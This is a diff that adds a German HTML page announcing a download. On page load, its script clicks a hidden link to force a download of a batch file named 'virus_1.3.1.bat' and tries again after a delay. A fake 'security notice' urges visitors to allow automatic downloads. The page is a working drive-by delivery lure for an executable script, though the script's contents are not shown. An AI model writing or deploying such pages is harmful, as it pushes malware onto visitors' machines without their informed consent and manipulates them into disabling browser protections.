@@ -1,1 +1,111 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download wird gestartet...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            text-align: center;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            max-width: 500px;
+            backdrop-filter: blur(10px);
+        }
+        h1 {
+            margin-top: 0;
+            font-size: 24px;
+        }
+        .warning {
+            background: rgba(217, 83, 79, 0.3);
+            border-left: 4px solid #d9534f;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            text-align: left;
+        }
+        .loader {
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 5px solid #fff;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .info {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body onload="startDownload()">
+    <div class="container">
+        <h1>Download wird gestartet...</h1>
+        
+        <div class="loader"></div>
+        
+        <div class="warning">
+            <strong>Sicherheitshinweis:</strong> Ihr Browser blockiert möglicherweise automatische Downloads. 
+            Bitte erlauben Sie Downloads von dieser Seite, falls Sie dazu aufgefordert werden.
+        </div>
+        
+        <p>Die Datei <strong>virus_1.3.1.bat</strong> wird heruntergeladen.</p>
+        
+        <p class="info">Falls der Download nicht automatisch startet, überprüfen Sie Ihre Browser-Einstellungen 
+        oder laden Sie die Seite neu.</p>
+    </div>
 
+    <script>
+        function startDownload() {
+            // Warte einen Moment, damit die Seite angezeigt wird
+            setTimeout(function() {
+                try {
+                    // Erstelle einen unsichtbaren Link für den Download
+                    const link = document.createElement('a');
+                    link.href = 'virus_1.3.1.bat';
+                    link.download = 'virus_1.3.1.bat';
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    
+                    // Versuche den Download
+                    link.click();
+                    
+                    // Aufräumen
+                    setTimeout(function() {
+                        document.body.removeChild(link);
+                    }, 100);
+                    
+                } catch (error) {
+                    console.error('Download fehlgeschlagen:', error);
+                    alert('Automatischer Download konnte nicht gestartet werden. Bitte erlauben Sie Downloads von dieser Seite.');
+                }
+            }, 1500); // 1.5 Sekunden Verzögerung
+        }
+        
+        // Alternativer Versuch für verschiedene Browser
+        window.addEventListener('load', function() {
+            // Zweiter Versuch nach zusätzlicher Verzögerung
+            setTimeout(startDownload, 3000);
+        });
+    </script>
+</body>
+</html>
